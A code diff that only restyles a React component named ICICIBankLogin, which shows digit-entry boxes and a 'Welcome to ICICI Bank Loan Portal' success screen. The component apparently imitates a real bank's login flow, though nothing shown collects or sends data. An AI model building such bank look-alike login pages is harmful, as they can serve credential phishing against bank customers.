@@ -61,13 +61,13 @@ export default function ICICIBankLogin() {
                     maxLength={4}
                     value={v}
                     onChange={e => handleChange(i, e.target.value.replace(/\D/g, ""))}
+                    className="text-center"
                     style={{
                       width: 64,
                       height: 48,
                       fontSize: 24,
                       border: "2px solid #ffb74d",
                       borderRadius: 8,
-                      textAlign: "center",
                       outline: "none",
                       background: "#fff",
                       color: "#333",
@@ -88,7 +88,7 @@ export default function ICICIBankLogin() {
               <div style={{ color: "#ff7f00", fontSize: 12, marginTop: 18 }}>Please do not click on your internet browser's back or refresh button during the application process. Only use the ICICI's page back button if available.</div>
             </form>
           ) : (
-            <div style={{ textAlign: "center", padding: 32 }}>
+            <div className="text-center p-8">
               <div style={{ fontSize: 48, color: "#4caf50", marginBottom: 18 }}>✔</div>
               <div style={{ fontWeight: 700, fontSize: 24, color: "#333", marginBottom: 10 }}>Login Successful</div>
               <div style={{ color: "#ff7f00", fontSize: 18, fontWeight: 600, marginBottom: 18 }}>Welcome to ICICI Bank Loan Portal</div>
